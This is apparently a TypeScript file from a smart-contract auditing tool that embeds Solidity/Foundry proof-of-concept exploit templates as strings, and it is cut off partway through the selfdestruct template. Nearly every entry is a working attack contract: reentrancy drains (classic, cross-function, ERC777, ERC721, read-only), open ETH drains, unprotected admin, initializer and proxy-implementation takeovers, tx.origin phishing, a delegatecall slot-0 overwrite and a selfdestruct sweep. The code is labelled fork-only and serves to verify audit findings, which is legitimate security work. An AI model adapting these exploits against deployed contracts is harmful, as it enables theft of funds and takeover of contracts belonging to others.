/** Fallback PoC template sources, keyed by library file name. */
export const POC_FALLBACK_TEMPLATES: Record<string, string> = {
  "01-reentrancy-classic.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Classic ETH reentrancy drain\n/// @notice Detector: reentrancy. Target calls the attacker (or sends ETH)\n///         BEFORE updating the attacker's balance, so the attacker\n///         re-enters withdraw() and drains more than they deposited.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. Adapt IVictim to the target's real ABI.\n///      Passing = exploit reproduced on fork state.\n///      Failing = did NOT reproduce (guarded, or wrong interface).\n\ninterface IVictim {\n    function deposit() external payable;\n    function withdraw() external;\n}\n\ncontract ReentrancyAttacker {\n    IVictim public immutable victim;\n    uint256 public reentries;\n    uint256 public maxReentries;\n\n    constructor(address victim_) {\n        victim = IVictim(victim_);\n    }\n\n    function attack(uint256 maxReentries_) external payable {\n        maxReentries = maxReentries_;\n        victim.deposit{value: msg.value}();\n        victim.withdraw();\n    }\n\n    receive() external payable {\n        if (reentries < maxReentries && address(victim).balance >= 1 wei) {\n            reentries++;\n            victim.withdraw();\n        }\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 10 ether);\n\n        ReentrancyAttacker attacker = new ReentrancyAttacker(target);\n        uint256 targetBefore = target.balance;\n        uint256 attackerContractBefore = address(attacker).balance;\n\n        vm.prank(attackerEOA);\n        attacker.attack{value: 1 ether}(3);\n\n        uint256 drained = targetBefore > target.balance ? targetBefore - target.balance : 0;\n        console.log(\"drained:\", drained);\n        console.log(\"attacker reentries:\", attacker.reentries());\n\n        // Draining MORE than the 1 ether deposit proves the reentrancy.\n        assertGt(drained, 1 ether, \"exploit did not reproduce: drained <= deposit\");\n        assertGt(\n            address(attacker).balance,\n            attackerContractBefore + 1 ether,\n            \"attacker contract did not profit beyond its deposit\"\n        );\n    }\n}\n",
  "02-reentrancy-cross-function.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Cross-function reentrancy\n/// @notice Detector: reentrancy (cross-function). Two functions share one\n///         balance mapping. withdraw() sends ETH before updating state, and\n///         the attacker re-enters a DIFFERENT function (transfer/send) that\n///         reads the same not-yet-updated balance, double-spending it.\n///         A reentrancy guard on withdraw() alone does NOT stop this.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt the second function name to\n///      the target (transfer / transferTo / send / move / pay).\n\ninterface IVictim {\n    function deposit() external payable;\n    function withdraw() external;\n    // TODO: second function sharing the balance mapping.\n    function transfer(address to, uint256 amount) external;\n    function balanceOf(address who) external view returns (uint256);\n}\n\ncontract CrossFunctionAttacker {\n    IVictim public immutable victim;\n    bool public reentered;\n\n    constructor(address victim_) {\n        victim = IVictim(victim_);\n    }\n\n    function attack() external payable {\n        victim.deposit{value: msg.value}();\n        victim.withdraw();\n        // After the callback moved credit a second time, withdraw again.\n        victim.withdraw();\n    }\n\n    receive() external payable {\n        if (!reentered) {\n            reentered = true;\n            // Re-enter through the OTHER function, not withdraw().\n            victim.transfer(address(this), msg.value);\n        }\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 10 ether);\n\n        CrossFunctionAttacker attacker = new CrossFunctionAttacker(target);\n        uint256 attackerBefore = address(attacker).balance;\n\n        vm.prank(attackerEOA);\n        attacker.attack{value: 1 ether}();\n\n        uint256 profit = address(attacker).balance - attackerBefore;\n        console.log(\"attacker profit:\", profit);\n        assertGt(profit, 1 ether, \"exploit did not reproduce: no double-spend via second function\");\n    }\n}\n",
  "03-reentrancy-erc777.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- ERC777 tokensReceived hook reentrancy\n/// @notice Detector: reentrancy. ERC777 tokens call tokensReceived() on the\n///         recipient BEFORE the sender's state settles. A vault that sends\n///         ERC777 tokens back and only then updates the user's balance lets\n///         the attacker re-enter withdraw() from the hook.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt IVault to the target's real\n///      deposit/withdraw signatures and the ERC777 token address.\n\ninterface IERC777 {\n    function balanceOf(address who) external view returns (uint256);\n    function send(address to, uint256 amount, bytes calldata data) external;\n}\n\ninterface IVault {\n    function deposit(uint256 amount) external;\n    function withdraw(uint256 amount) external;\n}\n\ncontract ERC777Attacker {\n    IVault public immutable vault;\n    IERC777 public immutable token;\n    uint256 public reentries;\n    uint256 public maxReentries;\n    uint256 public amount;\n\n    constructor(address vault_, address token_) {\n        vault = IVault(vault_);\n        token = IERC777(token_);\n    }\n\n    function attack(uint256 amount_, uint256 maxReentries_) external {\n        amount = amount_;\n        maxReentries = maxReentries_;\n        vault.deposit(amount);\n        vault.withdraw(amount);\n    }\n\n    // ERC777 calls this on the recipient during token.send().\n    function tokensReceived(\n        address,\n        address,\n        address,\n        uint256,\n        bytes calldata,\n        bytes calldata\n    ) external {\n        if (reentries < maxReentries) {\n            reentries++;\n            vault.withdraw(amount);\n        }\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: the ERC777 token the vault holds.\n    address public constant TOKEN = address(0);\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(TOKEN != address(0), \"set TOKEN to the ERC777 token address\");\n\n        address attackerEOA = makeAddr(\"attacker\");\n        ERC777Attacker attacker = new ERC777Attacker(target, TOKEN);\n\n        // Fund the attacker contract with tokens (prank a holder / whale).\n        // TODO: replace with a real holder on this fork.\n        address whale = makeAddr(\"whale\");\n        vm.prank(whale);\n        IERC777(TOKEN).send(address(attacker), 1000, bytes(\"\")); \n\n        uint256 before = IERC777(TOKEN).balanceOf(address(attacker));\n        vm.prank(attackerEOA);\n        attacker.attack(100, 3);\n        uint256 after_ = IERC777(TOKEN).balanceOf(address(attacker));\n\n        console.log(\"token balance before:\", before);\n        console.log(\"token balance after:\", after_);\n        console.log(\"reentries:\", attacker.reentries());\n        assertGt(after_, before, \"exploit did not reproduce: no extra tokens via hook reentrancy\");\n\n    }\n}\n",
  "04-reentrancy-erc721.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- ERC721 onERC721Received reentrancy\n/// @notice Detector: reentrancy. Minting/buying an NFT calls\n///         onERC721Received() on the recipient. A minter that mints and\n///         calls back BEFORE updating its sold/supply accounting lets the\n///         attacker re-enter mint() and get extra NFTs for one payment.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt INFT to the target's real\n///      mint/buy signature and price.\n\ninterface INFT {\n    function mint() external payable;\n    function balanceOf(address who) external view returns (uint256);\n}\n\ncontract ERC721Attacker {\n    INFT public immutable nft;\n    uint256 public reentries;\n    uint256 public maxReentries;\n    uint256 public price;\n\n    constructor(address nft_) {\n        nft = INFT(nft_);\n    }\n\n    function attack(uint256 price_, uint256 maxReentries_) external payable {\n        price = price_;\n        maxReentries = maxReentries_;\n        nft.mint{value: price}();\n    }\n\n    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {\n        if (reentries < maxReentries) {\n            reentries++;\n            nft.mint{value: price}();\n        }\n        return this.onERC721Received.selector;\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: the mint price of one NFT on this target.\n    uint256 public constant PRICE = 0;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(PRICE > 0, \"set PRICE to one NFT's mint price\");\n\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 10 ether);\n\n        ERC721Attacker attacker = new ERC721Attacker(target);\n        vm.prank(attackerEOA);\n        attacker.attack{value: PRICE}(PRICE, 2);\n\n        uint256 owned = INFT(target).balanceOf(address(attacker));\n        console.log(\"NFTs owned for one payment:\", owned);\n        console.log(\"reentries:\", attacker.reentries());\n        assertGt(owned, 1, \"exploit did not reproduce: one payment, one NFT\");\n\n    }\n}\n",
  "05-reentrancy-read-only.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Read-only reentrancy (stale view mid-callback)\n/// @notice Detector: read-only-reentrancy. A view function reads state that\n///         a mutating function only updates AFTER an external call. During\n///         the callback the view returns a STALE value, and any contract\n///         that prices / lends / settles off that view acts on wrong data.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt the view function to the\n///      target's real one (balanceOf / getPrice / totalSupply / getReserves).\n\ninterface IVictim {\n    function deposit() external payable;\n    function withdraw() external;\n    // TODO: the view that reads state updated after the external call.\n    function balanceOf(address who) external view returns (uint256);\n}\n\ncontract ReadOnlyAttacker {\n    IVictim public immutable victim;\n    uint256 public staleValue;\n    bool public captured;\n\n    constructor(address victim_) {\n        victim = IVictim(victim_);\n    }\n\n    function attack() external payable {\n        victim.deposit{value: msg.value}();\n        victim.withdraw();\n    }\n\n    receive() external payable {\n        if (!captured) {\n            captured = true;\n            // Mid-callback: victim has sent ETH but not yet updated state.\n            staleValue = victim.balanceOf(address(this));\n        }\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 10 ether);\n\n        ReadOnlyAttacker attacker = new ReadOnlyAttacker(target);\n        vm.prank(attackerEOA);\n        attacker.attack{value: 1 ether}();\n\n        uint256 settledValue = IVictim(target).balanceOf(address(attacker));\n        console.log(\"view mid-callback (stale):\", attacker.staleValue());\n        console.log(\"view after settle:\", settledValue);\n        // On a fixed target the view already reflects the withdrawal\n        // mid-callback, so stale == settled and this fails.\n        assertTrue(\n            attacker.staleValue() != settledValue,\n            \"exploit did not reproduce: view was already settled mid-callback\"\n        );\n    }\n}\n",
  "06-open-drain.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Open drain (unprotected ether send)\n/// @notice Detector: unprotected-ether. A payout function has no access\n///         check and no entitlement bound, so ANY caller can drain the\n///         contract's balance.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. Tries the common payout selectors in turn;\n///      each attempt must move funds to count as proof (a fallback fn that\n///      silently succeeds proves nothing).\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        uint256 targetBefore = target.balance;\n        require(targetBefore > 0, \"target holds no ETH to drain\");\n\n        // TODO: narrow to the target's real payout function if known.\n        bytes[] memory candidates = new bytes[](4);\n        candidates[0] = abi.encodeWithSignature(\"withdraw()\");\n        candidates[1] = abi.encodeWithSignature(\"claim()\");\n        candidates[2] = abi.encodeWithSignature(\"drain()\");\n        candidates[3] = abi.encodeWithSignature(\"withdrawAll()\");\n\n        bool drained = false;\n        for (uint256 i = 0; i < candidates.length; i++) {\n            vm.prank(attackerEOA);\n            (bool ok,) = target.call(candidates[i]);\n            if (ok && target.balance < targetBefore) {\n                drained = true;\n                console.log(\"drained via candidate index:\", i);\n                break;\n            }\n        }\n        console.log(\"target balance before:\", targetBefore);\n        console.log(\"target balance after:\", target.balance);\n        assertTrue(drained, \"exploit did not reproduce: no payout selector drained funds\");\n    }\n}\n",
  "07-unprotected-admin.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Unprotected privileged function\n/// @notice Detector: unprotected-admin. A privileged function (mint, set\n///         owner, pause, ...) has no access check, so ANY caller can use\n///         it. Tries mint / setOwner / pause in turn; each attempt must\n///         change observable state to count as proof.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: narrow to the target's real\n///      privileged function if known.\n\ninterface IERC20 {\n    function balanceOf(address who) external view returns (uint256);\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function _readOwner() internal view returns (bool found, address owner_) {\n        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature(\"owner()\"));\n        if (ok && ret.length == 32) return (true, abi.decode(ret, (address)));\n        return (false, address(0));\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        // Attempt 1: mint tokens to the attacker.\n        vm.prank(attackerEOA);\n        (bool mintOk,) = target.call(\n            abi.encodeWithSignature(\"mint(address,uint256)\", attackerEOA, 1000 ether)\n        );\n        if (mintOk) {\n            (bool balOk, bytes memory ret) =\n                target.staticcall(abi.encodeWithSignature(\"balanceOf(address)\", attackerEOA));\n            if (balOk && abi.decode(ret, (uint256)) >= 1000 ether) {\n                console.log(\"proved via unprotected mint\");\n                return;\n            }\n        }\n\n        // Attempt 2: take ownership.\n        vm.prank(attackerEOA);\n        (bool ownerOk,) = target.call(\n            abi.encodeWithSignature(\"setOwner(address)\", attackerEOA)\n        );\n        if (ownerOk) {\n            (bool found, address owner_) = _readOwner();\n            if (found && owner_ == attackerEOA) {\n                console.log(\"proved via unprotected setOwner\");\n                return;\n            }\n        }\n\n        // Attempt 3: pause the contract.\n        vm.prank(attackerEOA);\n        (bool pauseOk,) = target.call(abi.encodeWithSignature(\"pause()\"));\n        if (pauseOk) {\n            (bool pausedOk, bytes memory ret) =\n                target.staticcall(abi.encodeWithSignature(\"paused()\"));\n            if (pausedOk && abi.decode(ret, (bool))) {\n                console.log(\"proved via unprotected pause\");\n                return;\n            }\n        }\n\n        revert(\"exploit did not reproduce: no privileged function was callable by anyone\");\n    }\n}\n",
  "08-unprotected-initializer.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Unprotected initializer (proxy takeover)\n/// @notice Detector: unprotected-initializer. A proxy's initialize() has no\n///         guard (no `initializer` modifier, or it can be called twice), so\n///         ANY caller can initialize the proxy and become its owner/admin.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt the initialize signature to\n///      the target (initialize(address) / initialize(address,address) /\n///      initialize(bytes)).\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        // TODO: use the target's real initialize signature.\n        vm.prank(attackerEOA);\n        (bool ok,) = target.call(\n            abi.encodeWithSignature(\"initialize(address)\", attackerEOA)\n        );\n        require(ok, \"initialize(address) call failed -- adapt the signature\");\n\n        (bool ownerOk, bytes memory ret) =\n            target.staticcall(abi.encodeWithSignature(\"owner()\"));\n        require(ownerOk, \"target has no owner() view -- adapt the ownership check\");\n        address owner_ = abi.decode(ret, (address));\n        console.log(\"owner after initialize:\", owner_);\n        assertEq(owner_, attackerEOA, \"exploit did not reproduce: attacker is not owner\");\n    }\n}\n",
  "09-tx-origin-phishing.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- tx.origin authentication bypass (phishing)\n/// @notice Detector: tx-origin. The target authenticates with tx.origin\n///         instead of msg.sender. A victim who is tricked into calling a\n///         malicious contract still has tx.origin == victim, so the\n///         malicious contract can act as the victim.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: set OWNER to the victim whose\n///      authority the target trusts, and adapt withdraw() to the target's\n///      privileged function.\n\ninterface IVictim {\n    function withdraw() external;\n}\n\ncontract Phisher {\n    IVictim public immutable victim;\n\n    constructor(address victim_) {\n        victim = IVictim(victim_);\n    }\n\n    // Victim calls this; victim.withdraw() sees tx.origin == victim.\n    function attack() external {\n        victim.withdraw();\n    }\n\n    receive() external payable {}\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // TODO: the account the target trusts via tx.origin.\n    address public constant OWNER = address(0);\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        require(OWNER != address(0), \"set OWNER to the trusted victim account\");\n\n        Phisher phisher = new Phisher(target);\n        uint256 phisherBefore = address(phisher).balance;\n        uint256 targetBefore = target.balance;\n\n        // Victim is tricked into calling the phisher. Two-arg prank sets\n        // BOTH msg.sender and tx.origin for the call (one-arg prank only\n        // sets msg.sender — tx.origin would stay forge's default sender).\n        vm.prank(OWNER, OWNER);\n        phisher.attack();\n\n        uint256 gained = address(phisher).balance - phisherBefore;\n        console.log(\"target balance before:\", targetBefore);\n        console.log(\"target balance after:\", target.balance);\n        console.log(\"phisher gained:\", gained);\n        assertGt(gained, 0, \"exploit did not reproduce: tx.origin check did not accept the phisher\");\n\n    }\n}\n",
  "10-delegatecall-takeover.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Delegatecall to attacker-controlled logic\n/// @notice Detector: delegatecall / bytecode-delegatecall. The target\n///         delegatecalls to an implementation the caller chooses (or can\n///         upgrade). Delegatecall runs the attacker's code IN THE TARGET'S\n///         STORAGE, so an SSTORE to slot 0 overwrites the target's owner.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. TODO: adapt the entry point -- the target\n///      may expose it as execute(address,bytes), upgradeTo(address),\n///      setImplementation(address), or delegate(address,bytes).\n\ncontract MaliciousImpl {\n    // Runs via delegatecall: sstore writes to the TARGET's storage.\n    // caller() is preserved msg.sender (the attacker), so slot 0 becomes\n    // the attacker -- slot 0 is `owner` in most contracts (verify!).\n    function pwn() external {\n        assembly {\n            sstore(0, caller())\n        }\n    }\n\n    function owner() external view returns (address) {\n        address o;\n        assembly {\n            o := sload(0)\n        }\n        return o;\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function _readOwner() internal view returns (bool found, address owner_) {\n        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature(\"owner()\"));\n        if (ok && ret.length == 32) return (true, abi.decode(ret, (address)));\n        return (false, address(0));\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n        MaliciousImpl malicious = new MaliciousImpl();\n\n        // Attempt 1: target lets the caller pick the delegatecall target.\n        vm.prank(attackerEOA);\n        (bool ok,) = target.call(\n            abi.encodeWithSignature(\n                \"execute(address,bytes)\",\n                address(malicious),\n                abi.encodeWithSignature(\"pwn()\")\n            )\n        );\n        if (!ok) {\n            // Attempt 2: upgrade-then-call shape.\n            vm.prank(attackerEOA);\n            (bool upOk,) = target.call(\n                abi.encodeWithSignature(\"upgradeTo(address)\", address(malicious))\n            );\n            require(upOk, \"neither execute(address,bytes) nor upgradeTo(address) worked -- adapt the entry point\");\n            vm.prank(attackerEOA);\n            (bool pwnOk,) = target.call(abi.encodeWithSignature(\"pwn()\"));\n            require(pwnOk, \"pwn() call on upgraded target failed\");\n        }\n\n        (bool found, address owner_) = _readOwner();\n        require(found, \"target has no owner() view -- check slot 0 via vm.load instead\");\n        console.log(\"owner after delegatecall:\", owner_);\n        assertEq(owner_, attackerEOA, \"exploit did not reproduce: slot 0 is not the attacker\");\n    }\n}\n",
  "11-proxy-uninitialized-implementation.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Uninitialized implementation behind a proxy\n/// @notice Detector: unprotected-initializer / bytecode-proxy. The proxy\n///         delegates to an implementation that was NEVER initialized, so\n///         ANYONE can call initialize() on the implementation DIRECTLY\n///         (bypassing the proxy) and become its owner -- then upgrade the\n///         proxy or drain it.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. Reads the EIP-1967 implementation slot.\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n    // EIP-1967 implementation slot: keccak256(\"eip1967.proxy.implementation\") - 1\n    bytes32 public constant IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_exploit() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n\n        address impl = address(uint160(uint256(vm.load(target, IMPLEMENTATION_SLOT))));\n        console.log(\"implementation:\", impl);\n        require(impl != address(0), \"no EIP-1967 implementation slot -- not a standard proxy\");\n\n        // Initialize the implementation DIRECTLY, not through the proxy.\n        // TODO: adapt the initialize signature to the implementation.\n        vm.prank(attackerEOA);\n        (bool ok,) = impl.call(\n            abi.encodeWithSignature(\"initialize(address)\", attackerEOA)\n        );\n        require(ok, \"initialize(address) on implementation failed -- adapt the signature\");\n\n        (bool ownerOk, bytes memory ret) =\n            impl.staticcall(abi.encodeWithSignature(\"owner()\"));\n        require(ownerOk, \"implementation has no owner() view -- adapt the ownership check\");\n        address owner_ = abi.decode(ret, (address));\n        console.log(\"implementation owner after direct initialize:\", owner_);\n        assertEq(owner_, attackerEOA, \"exploit did not reproduce: attacker is not implementation owner\");\n    }\n}\n",
  "12-selfdestruct.t.sol": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\n/// @title Fallback PoC -- Selfdestruct: destroy + forced ETH\n/// @notice Detector: selfdestruct / bytecode-selfdestruct.\n///         (a) destroy(): anyone (or a single key) can selfdestruct the\n///             target and sweep its balance to a chosen recipient.\n///         (b) forced ETH: selfdestruct ALWAYS force-sends ETH, even to\n///             contracts that reject plain transfers -- breaking exact-\n///             balance checks and force-funding targets.\n/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via\n///      scripts/run-fork-poc.sh. NOTE (Cancun / EIP-6780): selfdestruct in\n///      a LATER transaction only moves the balance -- it no longer deletes\n///      code. So this PoC asserts the BALANCE moved, not code deletion.\n///      The constructor selfdestruct in Forcer still works (same tx as\n///      creation).\n\ncontract Forcer {\n    // Selfdestruct in the constructor: same tx as creation, so the\n    // balance transfer still executes post-Cancun.\n    constructor(address payable to) payable {\n        selfdestruct(to);\n    }\n}\n\ncontract PoC is Test {\n    address public target;\n    uint256 public forkBlock;\n\n    function setUp() public {\n        target = vm.envOr(\"POC_TARGET\", address(0));\n        require(target != address(0), \"POC_TARGET not set\");\n        forkBlock = vm.envOr(\"POC_FORK_BLOCK\", uint256(0));\n        string memory rpc = vm.envOr(\"POC_RPC_URL\", string(\"mainnet\"));\n        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);\n        vm.selectFork(forkId);\n    }\n\n    function test_forkSanity() public {\n        assertGt(target.code.length, 0, \"target has no code at this fork block\");\n    }\n\n    function test_destroySweepsBalance() public {\n        address attackerEOA = makeAddr(\"attacker\");\n        vm.deal(attackerEOA, 1 ether);\n        uint256 targetBefore = target.balance;\n        require(targetBefore > 0, \"target holds no ETH to sweep\");\n\n        // TODO: adapt to the target's real destroy function.\n        